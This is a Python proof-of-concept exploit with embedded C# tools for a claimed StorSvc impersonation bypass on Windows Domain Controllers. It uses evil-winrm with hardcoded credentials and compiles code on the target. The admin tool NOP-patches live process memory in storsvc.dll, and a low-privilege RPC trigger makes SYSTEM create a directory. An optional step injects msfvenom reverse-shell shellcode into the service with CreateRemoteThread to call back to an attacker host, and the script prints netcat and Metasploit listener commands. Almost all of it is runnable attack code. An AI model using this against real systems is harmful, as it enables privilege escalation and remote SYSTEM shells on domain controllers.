#!/usr/bin/env python3
"""
StorSvc DC Impersonation Bypass — PoC + SYSTEM Callback
========================================================
Demonstrates CVE: storsvc.dll FUN_180027eac bitmask bug skips
RpcImpersonateClient on Domain Controllers (product type 2).

Steps:
  1. Get StorSvc PID
  2. Upload + compile C# tools on DC via csc.exe
  3. Admin: patch JS + plant tier data
  4. Low-priv: trigger opnum 17 → SYSTEM directory creation
  5. Admin: verify + unpatch
  6. (Optional) Inject shellcode into StorSvc for SYSTEM callback
"""

import subprocess, re, base64, sys, os

# ═══════════════════════════════════════════════════════════════
#  TARGET CONFIGURATION
# ═══════════════════════════════════════════════════════════════

TARGET     = "192.168.15.207"
DOMAIN     = "CVE"
ADMIN_USER = "administrator"
ADMIN_PASS = "1qaz2wsx!QAZ@WSX"
TEST_USER  = "bob.marley"
TEST_PASS  = "P@ssw0rd!"
TIMEOUT    = 300

# For SYSTEM callback (Step 6) — set LHOST to your Kali IP
LHOST = ""     # e.g. "192.168.15.100" — leave empty to skip callback
LPORT = "443"

# ═══════════════════════════════════════════════════════════════
#  C# SOURCE — Admin Tool (patch/plant/inject/unpatch)
# ═══════════════════════════════════════════════════════════════

CSHARP_ADMIN = r'''using System;
using System.Runtime.InteropServices;
using System.Text;

namespace StorSvcAdmin
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr OpenProcess(int access, bool inh, int pid);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int sz, out int read);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int sz, out int written);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool VirtualProtectEx(IntPtr h, IntPtr addr, int sz, int prot, out int old);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, int sz, int type, int prot);
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, uint stackSz,
            IntPtr startAddr, IntPtr param, uint flags, out uint threadId);
        [DllImport("psapi.dll", SetLastError=true)]
        static extern bool EnumProcessModulesEx(IntPtr h, IntPtr[] mods, int cb, out int needed, int filter);
        [DllImport("psapi.dll", CharSet=CharSet.Unicode, SetLastError=true)]
        static extern int GetModuleFileNameEx(IntPtr h, IntPtr mod, StringBuilder name, int sz);

        const int PROCESS_ALL_ACCESS = 0x001F0FFF;
        const int GLOBAL_RVA = 0xF2E10;
        const int OP17_RVA = 0x2BF78;
        const int JS_OFFSET = 0x78;
        const int PAGE_EXECUTE_READWRITE = 0x40;
        const int MEM_COMMIT_RESERVE = 0x3000;

        static byte[] ReadMem(IntPtr hProc, long addr, int size)
        {
            byte[] buf = new byte[size];
            int read;
            if(!ReadProcessMemory(hProc, new IntPtr(addr), buf, size, out read))
                return null;
            return buf;
        }

        static bool WriteMem(IntPtr hProc, long addr, byte[] data)
        {
            int written;
            return WriteProcessMemory(hProc, new IntPtr(addr), data, data.Length, out written);
        }

        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for(int i = 0; i < bytes.Length; i++)
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return bytes;
        }

        static void Main(string[] args)
        {
            if(args.Length < 2)
            {
                Console.WriteLine("Usage: tool <patchplant|unpatch|inject> <PID> [hex_shellcode]");
                return;
            }
            string mode = args[0];
            int pid = int.Parse(args[1]);

            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if(hProc == IntPtr.Zero)
            {
                Console.WriteLine("[ERR] OpenProcess: " + Marshal.GetLastWin32Error());
                return;
            }

            if(mode == "inject" && args.Length >= 3)
            {
                DoInject(hProc, args[2]);
                CloseHandle(hProc);
                return;
            }

            IntPtr[] mods = new IntPtr[1024]; int needed;
            EnumProcessModulesEx(hProc, mods, mods.Length * IntPtr.Size, out needed, 3);
            int count = needed / IntPtr.Size;
            long storsvcBase = 0;
            StringBuilder sb = new StringBuilder(260);
            for(int i=0; i<count; i++)
            {
                sb.Clear(); GetModuleFileNameEx(hProc, mods[i], sb, 260);
                if(sb.ToString().ToLower().Contains("storsvc"))
                { storsvcBase = (long)mods[i]; break; }
            }
            if(storsvcBase==0) { Console.WriteLine("[ERR] storsvc.dll not found"); CloseHandle(hProc); return; }
            Console.WriteLine(string.Format("[+] storsvc.dll=0x{0:X}", storsvcBase));

            if(mode == "patchplant") DoPatchAndPlant(hProc, storsvcBase);
            else if(mode == "unpatch") DoUnpatch(hProc, storsvcBase);

            CloseHandle(hProc);
        }

        static void DoInject(IntPtr hProc, string hexShellcode)
        {
            Console.WriteLine("[*] === SHELLCODE INJECTION ===");
            byte[] sc = HexToBytes(hexShellcode);
            Console.WriteLine(string.Format("[*] Shellcode size: {0} bytes", sc.Length));

            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, sc.Length,
                MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
            if(addr == IntPtr.Zero)
            {
                Console.WriteLine("[ERR] VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine(string.Format("[+] Allocated RWX at 0x{0:X}", (long)addr));

            bool wOk = WriteMem(hProc, (long)addr, sc);
            if(!wOk)
            {
                Console.WriteLine("[ERR] WriteProcessMemory failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode written");

            uint threadId;
            IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, out threadId);
            if(hThread == IntPtr.Zero)
            {
                Console.WriteLine("[ERR] CreateRemoteThread failed: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine(string.Format("[+] Remote thread created (TID={0})", threadId));
            Console.WriteLine("[+] Shellcode executing as NT AUTHORITY\\SYSTEM");
            CloseHandle(hThread);
        }

        static void DoPatchAndPlant(IntPtr hProc, long dllBase)
        {
            Console.WriteLine("[*] === PATCHING OP17 ===");
            long jsAddr = dllBase + OP17_RVA + JS_OFFSET;
            Console.WriteLine(string.Format("[*] JS instruction at 0x{0:X} (RVA 0x{1:X}+0x{2:X})", jsAddr, OP17_RVA, JS_OFFSET));

            byte[] curBytes = ReadMem(hProc, jsAddr, 6);
            if(curBytes == null) { Console.WriteLine("[ERR] Can't read JS bytes"); return; }

            StringBuilder hx = new StringBuilder();
            for(int i=0; i<6; i++) hx.AppendFormat("{0:X2} ", curBytes[i]);
            Console.WriteLine("[*] Current bytes: " + hx.ToString().TrimEnd());

            if(curBytes[0] != 0x0F || curBytes[1] != 0x88)
            {
                if(curBytes[0] == 0x90 && curBytes[1] == 0x90)
                    Console.WriteLine("[*] Already patched (NOPs found)");
                else
                {
                    Console.WriteLine("[ERR] Unexpected bytes at JS site. Aborting.");
                    return;
                }
            }
            else
            {
                Console.WriteLine("[*] Original JS: 0F 88 9F 02 00 00 confirmed");
                int oldProt;
                bool vpOk = VirtualProtectEx(hProc, new IntPtr(jsAddr), 6, PAGE_EXECUTE_READWRITE, out oldProt);
                Console.WriteLine(string.Format("[{0}] VirtualProtectEx RWX (old=0x{1:X})", vpOk?"+":"ERR", oldProt));
                if(!vpOk) { Console.WriteLine("[ERR] VirtualProtectEx failed: " + Marshal.GetLastWin32Error()); return; }

                byte[] nops = new byte[] { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
                bool wOk = WriteMem(hProc, jsAddr, nops);
                Console.WriteLine(string.Format("[{0}] Wrote 6 NOPs at JS location", wOk?"+":"ERR"));

                int dummy;
                VirtualProtectEx(hProc, new IntPtr(jsAddr), 6, oldProt, out dummy);

                byte[] verify = ReadMem(hProc, jsAddr, 6);
                if(verify != null)
                {
                    hx = new StringBuilder();
                    for(int i=0; i<6; i++) hx.AppendFormat("{0:X2} ", verify[i]);
                    Console.WriteLine("[+] Patched bytes: " + hx.ToString().TrimEnd());
                    bool allNop = true;
                    for(int i=0; i<6; i++) if(verify[i]!=0x90) allNop = false;
                    Console.WriteLine("[" + (allNop?"+":"ERR") + "] Patch verified: " + (allNop?"OK":"MISMATCH"));
                }
            }

            Console.WriteLine("[*] === PLANTING TIER DATA ===");
            long globalAddr = dllBase + GLOBAL_RVA;
            byte[] ptrs = ReadMem(hProc, globalAddr + 0x28, 0x10);
            if(ptrs == null) { Console.WriteLine("[ERR] Can't read tier ptrs"); return; }
            long tier0 = BitConverter.ToInt64(ptrs, 0);
            long tier1 = BitConverter.ToInt64(ptrs, 8);
            Console.WriteLine(string.Format("[+] Tier0=0x{0:X} Tier1=0x{1:X}", tier0, tier1));

            string targetPath = @"C:\temp\storsvc_work\poc_vuln";
            byte[] pathBytes = Encoding.Unicode.GetBytes(targetPath + "\0");
            byte[] status0 = BitConverter.GetBytes((int)0);

            if(tier1 > 0x10000)
            {
                long e0 = tier1;
                byte[] zeros = new byte[0x450];
                WriteMem(hProc, e0, zeros);
                WriteMem(hProc, e0 + 4, pathBytes);
                WriteMem(hProc, e0 + 0x210, status0);

                byte[] vfy = ReadMem(hProc, e0 + 4, pathBytes.Length);
                if(vfy != null) Console.WriteLine("[+] T1[0] path=\"" + Encoding.Unicode.GetString(vfy).TrimEnd('\0') + "\"");
                Console.WriteLine("[+] T1[0] status=0 planted");
            }

            if(tier0 > 0x10000)
            {
                for(int idx=0; idx<2; idx++)
                {
                    long eAddr = tier0 + idx * 0x450;
                    byte[] zeros = new byte[0x450];
                    WriteMem(hProc, eAddr, zeros);
                    WriteMem(hProc, eAddr + 4, pathBytes);
                    WriteMem(hProc, eAddr + 0x210, status0);
                    Console.WriteLine(string.Format("[+] T0[{0}] planted", idx));
                }
            }

            Console.WriteLine("[+] Patch + plant complete");
        }

        static void DoUnpatch(IntPtr hProc, long dllBase)
        {
            Console.WriteLine("[*] === UNPATCHING ===");
            long jsAddr = dllBase + OP17_RVA + JS_OFFSET;

            byte[] curBytes = ReadMem(hProc, jsAddr, 6);
            if(curBytes == null) { Console.WriteLine("[ERR] Can't read"); return; }

            StringBuilder hx = new StringBuilder();
            for(int i=0; i<6; i++) hx.AppendFormat("{0:X2} ", curBytes[i]);
            Console.WriteLine("[*] Current: " + hx.ToString().TrimEnd());

            byte[] original = new byte[] { 0x0F, 0x88, 0x9F, 0x02, 0x00, 0x00 };
            int oldProt;
            VirtualProtectEx(hProc, new IntPtr(jsAddr), 6, PAGE_EXECUTE_READWRITE, out oldProt);
            bool ok = WriteMem(hProc, jsAddr, original);
            int dummy;
            VirtualProtectEx(hProc, new IntPtr(jsAddr), 6, oldProt, out dummy);

            Console.WriteLine(string.Format("[{0}] Restored original JS instruction", ok?"+":"ERR"));
        }
    }
}'''

# ═══════════════════════════════════════════════════════════════
#  C# SOURCE — Trigger (runs as low-priv user)
# ═══════════════════════════════════════════════════════════════

CSHARP_TRIGGER = r'''using System;
using System.Runtime.InteropServices;
using System.Runtime.ExceptionServices;
using System.Security;
using System.Text;
using System.IO;

namespace StorSvcTrigger
{
    class Program
    {
        [DllImport("rpcrt4.dll", CharSet=CharSet.Unicode)]
        static extern int RpcStringBindingCompose(string a,string b,string c,string d,string e,out IntPtr f);
        [DllImport("rpcrt4.dll", CharSet=CharSet.Unicode)]
        static extern int RpcBindingFromStringBinding(IntPtr a, out IntPtr b);
        [DllImport("rpcrt4.dll", CharSet=CharSet.Unicode)]
        static extern int RpcStringFree(ref IntPtr a);
        [DllImport("rpcrt4.dll")]
        static extern int RpcBindingFree(ref IntPtr a);
        [DllImport("rpcrt4.dll", CharSet=CharSet.Unicode)]
        static extern int RpcBindingToStringBinding(IntPtr a, out IntPtr b);
        [DllImport("rpcrt4.dll")]
        static extern int RpcMgmtEpEltInqBegin(IntPtr a,int b,ref RPC_IF_ID c,int d,ref Guid e,out IntPtr f);
        [DllImport("rpcrt4.dll", CharSet=CharSet.Unicode)]
        static extern int RpcMgmtEpEltInqNext(IntPtr a,out RPC_IF_ID b,out IntPtr c,out Guid d,out IntPtr e);
        [DllImport("rpcrt4.dll")]
        static extern int RpcMgmtEpEltInqDone(ref IntPtr a);
        [DllImport("rpcrt4.dll")]
        static extern int RpcBindingSetAuthInfo(IntPtr a,IntPtr b,int c,int d,IntPtr e,int f);
        [DllImport("rpcrt4.dll")]
        static extern int I_RpcGetBuffer(IntPtr m);
        [DllImport("rpcrt4.dll")]
        static extern int I_RpcSendReceive(IntPtr m);
        [DllImport("rpcrt4.dll")]
        static extern int I_RpcFreeBuffer(IntPtr m);
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string n);
        [DllImport("kernel32.dll")]
        static extern bool FreeLibrary(IntPtr h);
        [DllImport("kernel32.dll")]
        static extern IntPtr AddVectoredExceptionHandler(uint f, IntPtr h);
        [DllImport("kernel32.dll")]
        static extern uint RemoveVectoredExceptionHandler(IntPtr h);

        [StructLayout(LayoutKind.Sequential)]
        struct RPC_IF_ID { public Guid Uuid; public ushort VersMajor, VersMinor; }

        delegate int VehDel(IntPtr p);
        static int lastSeh;
        static VehDel vehDel;
        const int IFACE_RVA = 0xb5430;

        static int VH(IntPtr p){lastSeh=Marshal.ReadInt32(Marshal.ReadIntPtr(p));return 0;}

        [HandleProcessCorruptedStateExceptions]
        [SecurityCritical]
        static void Main(string[] args)
        {
            try { Run(); }
            catch(Exception ex) { Console.WriteLine("[ERR] FATAL: " + ex.Message); }
        }

        [HandleProcessCorruptedStateExceptions]
        [SecurityCritical]
        static void Run()
        {
            Console.WriteLine("[*] StorSvc Trigger v29 - user=" + Environment.UserName);

            string targetBase = @"C:\temp\storsvc_work\poc_vuln";
            string targetFull = Path.Combine(targetBase, "WindowsApps");

            if(!Directory.Exists(targetBase))
                Directory.CreateDirectory(targetBase);
            if(Directory.Exists(targetFull))
                try { Directory.Delete(targetFull, true); } catch {}
            if(File.Exists(targetFull))
                try { File.Delete(targetFull); } catch {}

            Console.WriteLine("[*] Target: " + targetFull);
            Console.WriteLine("[*] Before: exists=" + (Directory.Exists(targetFull) || File.Exists(targetFull)));

            string uuid = "d8140e00-5c46-4ae6-80ac-2f9a76df224c";
            string alpc = null;
            var ifId = new RPC_IF_ID(); var gu = Guid.Empty; IntPtr ctx;
            RpcMgmtEpEltInqBegin(IntPtr.Zero,0,ref ifId,0,ref gu,out ctx);
            RPC_IF_ID fi; IntPtr fb; Guid fo; IntPtr fa;
            while(RpcMgmtEpEltInqNext(ctx,out fi,out fb,out fo,out fa)==0){
                if(fi.Uuid.ToString().ToLower()==uuid){
                    IntPtr bs; if(RpcBindingToStringBinding(fb,out bs)==0){
                        string s=Marshal.PtrToStringUni(bs); RpcStringFree(ref bs);
                        if(s.StartsWith("ncalrpc:")){int a=s.IndexOf('['),b=s.IndexOf(']');if(a>=0&&b>a)alpc=s.Substring(a+1,b-a-1);}
                    }
                }
                if(fb!=IntPtr.Zero)RpcBindingFree(ref fb);
                if(fa!=IntPtr.Zero)RpcStringFree(ref fa);
            }
            RpcMgmtEpEltInqDone(ref ctx);
            if(alpc==null){Console.WriteLine("[ERR] No ALPC endpoint found");return;}
            Console.WriteLine("[+] ALPC="+alpc);

            IntPtr sb2; RpcStringBindingCompose(null,"ncalrpc",null,alpc,null,out sb2);
            IntPtr binding; RpcBindingFromStringBinding(sb2,out binding); RpcStringFree(ref sb2);
            RpcBindingSetAuthInfo(binding,IntPtr.Zero,6,10,IntPtr.Zero,0);

            IntPtr hDll = LoadLibrary("storsvc.dll");
            if(hDll==IntPtr.Zero){Console.WriteLine("[ERR] LoadLibrary storsvc.dll failed");return;}
            long gBase = (long)hDll;

            IntPtr origIface = new IntPtr(gBase + IFACE_RVA);
            IntPtr gIface = Marshal.AllocHGlobal(0x60);
            for(int i=0;i<0x60;i++) Marshal.WriteByte(gIface,i,Marshal.ReadByte(origIface,i));
            Marshal.WriteIntPtr(new IntPtr((long)gIface+0x30),IntPtr.Zero);
            Marshal.WriteInt32(new IntPtr((long)gIface+0x58),0);

            vehDel = new VehDel(VH);
            IntPtr veh = AddVectoredExceptionHandler(1,Marshal.GetFunctionPointerForDelegate(vehDel));

            int[][] combos = new int[][] {
                new int[]{1, 0},
                new int[]{0, 1},
            };

            foreach(var c in combos)
            {
                int e = c[0], l = c[1];
                byte[] wire = new byte[8];
                wire[0] = (byte)e;
                wire[4] = (byte)l;

                string r = CallRpc(binding, gIface, 17, wire);
                string marker = "";
                if(r.Contains("S_OK")) marker = " <<< SUCCESS";
                else if(!r.Contains("FILE_NOT_FOUND") && !r.Contains("E_INVALIDARG")) marker = " <<< NEW";
                Console.WriteLine(string.Format("[*] op17(e={0},l={1}): {2}{3}", e, l, r, marker));

                if(Directory.Exists(targetFull))
                {
                    Console.WriteLine("[+] *** VULN TRIGGERED ***");
                    Console.WriteLine("[+] Directory " + targetFull + " created!");
                    try
                    {
                        var di = new DirectoryInfo(targetFull);
                        var acl = di.GetAccessControl();
                        var owner = acl.GetOwner(typeof(System.Security.Principal.NTAccount));
                        Console.WriteLine("[+] Owner: " + owner);
                        foreach(System.Security.AccessControl.FileSystemAccessRule rule in
                            acl.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
                        {
                            Console.WriteLine(string.Format("[+] ACL: {0} -> {1} ({2})",
                                rule.IdentityReference, rule.FileSystemRights, rule.AccessControlType));
                        }
                    }
                    catch(Exception ex) { Console.WriteLine("[*] ACL error: " + ex.Message); }
                    break;
                }
            }

            Console.WriteLine("[*] === FINAL ===");
            bool exists = Directory.Exists(targetFull);
            Console.WriteLine("[*] WindowsApps exists: " + exists);
            if(!exists)
            {
                Console.WriteLine("[*] Dir contents:");
                if(Directory.Exists(targetBase))
                    foreach(string f in Directory.GetFileSystemEntries(targetBase))
                        Console.WriteLine("[*]   " + f);
            }

            RemoveVectoredExceptionHandler(veh);
            Marshal.FreeHGlobal(gIface);
            RpcBindingFree(ref binding);
            FreeLibrary(hDll);
        }

        [HandleProcessCorruptedStateExceptions]
        [SecurityCritical]
        static string CallRpc(IntPtr binding, IntPtr iface, int op, byte[] wire)
        {
            lastSeh = 0;
            IntPtr msg = Marshal.AllocHGlobal(0x50);
            bool needFree = false;
            try
            {
                for(int i=0;i<0x50;i++) Marshal.WriteByte(msg,i,0);
                Marshal.WriteIntPtr(msg,0x00,binding);
                Marshal.WriteInt32(msg,0x08,0x10);
                Marshal.WriteInt32(msg,0x18,wire.Length+256);
                Marshal.WriteInt32(msg,0x1C,op);
                Marshal.WriteIntPtr(msg,0x28,iface);
                int st = I_RpcGetBuffer(msg);
                if(st!=0) return string.Format("GetBuf=0x{0:X}",st);
                needFree = true;
                IntPtr buf = Marshal.ReadIntPtr(msg,0x10);
                Marshal.Copy(wire,0,buf,wire.Length);
                Marshal.WriteInt32(msg,0x18,wire.Length);
                st = I_RpcSendReceive(msg);
                if(st!=0){needFree=false; return string.Format("RPC=0x{0:X}({1})",st,Drpc(st));}
                buf = Marshal.ReadIntPtr(msg,0x10);
                int rl = Marshal.ReadInt32(msg,0x18);
                StringBuilder r = new StringBuilder();
                r.Append("len="+rl);
                if(rl>=4){uint hr=(uint)Marshal.ReadInt32(buf); r.AppendFormat(" 0x{0:X8}({1})",hr,Dhr(hr));}
                if(rl>=8){r.AppendFormat(" v1=0x{0:X8}",(uint)Marshal.ReadInt32(buf,4));}
                return r.ToString();
            }
            catch(Exception){needFree=false; return string.Format("SEH=0x{0:X}",lastSeh);}
            finally{if(needFree)try{I_RpcFreeBuffer(msg);}catch{}Marshal.FreeHGlobal(msg);}
        }

        static string Dhr(uint h){
            if(h==0)return"S_OK";if(h==1)return"S_FALSE";
            if(h==0x80070057)return"E_INVALIDARG";if(h==0x80070002)return"FILE_NOT_FOUND";
            if(h==0x80070005)return"E_ACCESSDENIED";if(h==0x80070003)return"PATH_NOT_FOUND";
            if(h==0x800706F7)return"BAD_STUB_DATA";if(h==0x80004005)return"E_FAIL";
            if(h==0x8007007A)return"INSUF_BUFFER";if(h==0x80070052)return"CANNOT_MAKE";
            return string.Format("0x{0:X8}",h);
        }
        static string Drpc(int c){
            if(c==0x6F7)return"BAD_STUB_DATA";if(c==0x6BA)return"UNAVAIL";
            if(c==0x6D1)return"PROCNUM_OOR";if(c==0x6A6)return"INVALID_BINDING";
            return string.Format("0x{0:X}",c);
        }
    }
}'''


# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════

def run_winrm(user, password, commands, domain=None, timeout=TIMEOUT):
    if domain:
        user = f"{domain}\\{user}"
    result = subprocess.run(
        ["evil-winrm", "-i", TARGET, "-u", user, "-p", password],
        input=commands.strip() + "\nexit\n",
        capture_output=True, text=True, timeout=timeout
    )
    clean = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', result.stdout)
    clean = re.sub(r'\[\?25[hl]|\[1G\[K|\[1G', '', clean)
    return clean


def print_output(output):
    for line in output.split('\n'):
        stripped = line.strip()
        if not stripped:
            continue
        if any(stripped.startswith(p) for p in ['[*]', '[+]', '[-]', '[ERR]']):
            print(stripped)


def generate_shellcode(lhost, lport):
    """Generate x64 reverse shell shellcode via msfvenom."""
    print(f"[*] Generating shellcode: {lhost}:{lport}")
    result = subprocess.run(
        ['msfvenom', '-p', 'windows/x64/shell_reverse_tcp',
         f'LHOST={lhost}', f'LPORT={lport}',
         '-f', 'hex', '--platform', 'windows', '-a', 'x64',
         'EXITFUNC=thread'],
        capture_output=True, text=True, timeout=60
    )
    if result.returncode != 0:
        print(f"[-] msfvenom failed: {result.stderr.strip()}")
        return None
    shellcode_hex = result.stdout.strip()
    print(f"[+] Shellcode generated: {len(shellcode_hex)//2} bytes")
    return shellcode_hex


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    print("=" * 70)
    print("  StorSvc Impersonation Bypass PoC + SYSTEM Callback")
    print("  storsvc.dll FUN_180027eac bitmask error on Domain Controllers")
    print("=" * 70)

    try:
        # ── Step 1: Get PID ──
        print("\n[*] Step 1: Get StorSvc PID")
        cmds = "\n".join([
            'Start-Service StorSvc -ErrorAction SilentlyContinue',
            '$svc = Get-WmiObject Win32_Service -Filter "Name=\'StorSvc\'"',
            'Write-Host ("[+] PID=" + $svc.ProcessId + " State=" + $svc.State)',
        ])
        output = run_winrm(ADMIN_USER, ADMIN_PASS, cmds)
        print_output(output)
        pid = None
        for line in output.split('\n'):
            m = re.search(r'PID=(\d+)', line)
            if m:
                pid = m.group(1)
        if not pid or pid == '0':
            print("[-] StorSvc not running")
            return

        # ── Step 2: Compile C# tools on DC ──
        print("\n[*] Step 2: Compile tools on DC")
        b64_admin = base64.b64encode(CSHARP_ADMIN.strip().encode('utf-8')).decode('ascii')
        b64_trigger = base64.b64encode(CSHARP_TRIGGER.strip().encode('utf-8')).decode('ascii')
        cmds = "\n".join([
            'New-Item -ItemType Directory -Path C:\\temp\\storsvc_work -Force | Out-Null',
            f'[System.IO.File]::WriteAllText("C:\\temp\\storsvc_work\\Admin29.cs", [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64_admin}")))',
            f'[System.IO.File]::WriteAllText("C:\\temp\\storsvc_work\\Trigger29.cs", [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64_trigger}")))',
            '$csc = Get-ChildItem "C:\\Windows\\Microsoft.NET\\Framework64\\v4*\\csc.exe" -ErrorAction SilentlyContinue | Select-Object -Last 1',
            '& $csc.FullName /out:C:\\temp\\storsvc_work\\Admin29.exe /target:exe /platform:x64 /nologo C:\\temp\\storsvc_work\\Admin29.cs 2>&1 | Where-Object { $_ -notmatch "warning" }',
            '& $csc.FullName /out:C:\\temp\\storsvc_work\\Trigger29.exe /target:exe /platform:x64 /nologo C:\\temp\\storsvc_work\\Trigger29.cs 2>&1 | Where-Object { $_ -notmatch "warning" }',
            '$a = Test-Path C:\\temp\\storsvc_work\\Admin29.exe',
            '$t = Test-Path C:\\temp\\storsvc_work\\Trigger29.exe',
            'Write-Host "[+] Admin=$a Trigger=$t"',
        ])
        output = run_winrm(ADMIN_USER, ADMIN_PASS, cmds)
        print_output(output)
        if 'False' in output:
            print("[!] Compilation failed")
            for line in output.split('\n'):
                if 'error' in line.lower() and 'ErrorAction' not in line:
                    print("    " + line.strip())
            return

        # ── Step 3: Patch + Plant (admin) ──
        print("\n[*] Step 3: Patch validation + plant tier data")
        print("=" * 70)
        cmds = "\n".join([
            'New-Item -ItemType Directory -Path C:\\temp\\storsvc_work\\poc_vuln -Force | Out-Null',
            f'C:\\temp\\storsvc_work\\Admin29.exe patchplant {pid} 2>&1',
        ])
        output = run_winrm(ADMIN_USER, ADMIN_PASS, cmds)
        print_output(output)

        # ── Step 4: Trigger as low-priv user ──
        print(f"\n[*] Step 4: Trigger op17 as {TEST_USER} (low-priv)")
        print("=" * 70)
        cmds = 'C:\\temp\\storsvc_work\\Trigger29.exe 2>&1'
        output = run_winrm(TEST_USER, TEST_PASS, cmds, domain=DOMAIN)
        print_output(output)

        vuln_confirmed = '*** VULN TRIGGERED ***' in output

        # ── Step 5: Verify + Unpatch ──
        print("\n[*] Step 5: Verify + unpatch")
        print("=" * 70)
        cmds = "\n".join([
            '$wa = "C:\\temp\\storsvc_work\\poc_vuln\\WindowsApps"',
            '$exists = Test-Path $wa',
            'Write-Host "[+] WindowsApps exists: $exists"',
            'if($exists) {',
            '  $acl = Get-Acl $wa',
            '  Write-Host "[+] Owner: $($acl.Owner)"',
            '  icacls $wa 2>&1 | ForEach-Object { Write-Host "[+] $_" }',
            '}',
            '$svc = Get-WmiObject Win32_Service -Filter "Name=\'StorSvc\'"',
            'Write-Host "[+] StorSvc state=$($svc.State) pid=$($svc.ProcessId)"',
            f'C:\\temp\\storsvc_work\\Admin29.exe unpatch {pid} 2>&1',
        ])
        output = run_winrm(ADMIN_USER, ADMIN_PASS, cmds)
        print_output(output)

        if not vuln_confirmed:
            vuln_confirmed = 'WindowsApps exists: True' in output

        # ── Step 6: SYSTEM Callback ──
        if LHOST and vuln_confirmed:
            print(f"\n[*] Step 6: SYSTEM callback -> {LHOST}:{LPORT}")
            print("=" * 70)
            print("[*] Make sure your listener is running:")
            print(f"[*]   nc -nlvp {LPORT}")
            print(f"[*]   (or: msfconsole -x 'use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run')")

            sc_hex = generate_shellcode(LHOST, LPORT)
            if sc_hex:
                cmds = f'C:\\temp\\storsvc_work\\Admin29.exe inject {pid} {sc_hex} 2>&1'
                output = run_winrm(ADMIN_USER, ADMIN_PASS, cmds)
                print_output(output)

                if 'Remote thread created' in output:
                    print(f"\n[+] *** SYSTEM SHELL INCOMING on {LHOST}:{LPORT} ***")
                else:
                    print("[-] Injection may have failed — check output above")
        elif LHOST and not vuln_confirmed:
            print("\n[-] Skipping callback — vulnerability not confirmed")
        elif not LHOST:
            print("\n[*] Set LHOST in poc.py to enable SYSTEM callback (Step 6)")

        # ── Summary ──
        print("\n" + "=" * 70)
        if vuln_confirmed:
            print("[+] RESULT: VULNERABLE")
            print("[+] NT AUTHORITY\\SYSTEM file operations triggered by low-priv user")
        else:
            print("[-] RESULT: Could not confirm vulnerability")
        print("=" * 70)

    except subprocess.TimeoutExpired:
        print("[!] Timeout — increase TIMEOUT if DC is slow")
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
